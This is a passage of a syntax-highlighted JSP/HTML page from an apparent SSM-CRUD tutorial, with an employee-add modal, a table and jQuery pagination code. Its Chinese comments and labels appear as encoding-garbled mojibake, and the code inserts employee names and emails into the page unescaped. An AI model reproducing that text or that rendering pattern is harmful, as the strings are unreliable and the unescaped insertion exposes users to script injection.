class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>å‘˜å·¥æ·»åŠ <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                éƒ¨é—¨åç§°-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>ä¿å­˜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»æ–°å¢æŒ‰é’®å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚ï¼ŒæŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œæ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨</span></span><br><span class="line"><span class="xml">        getDepts();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    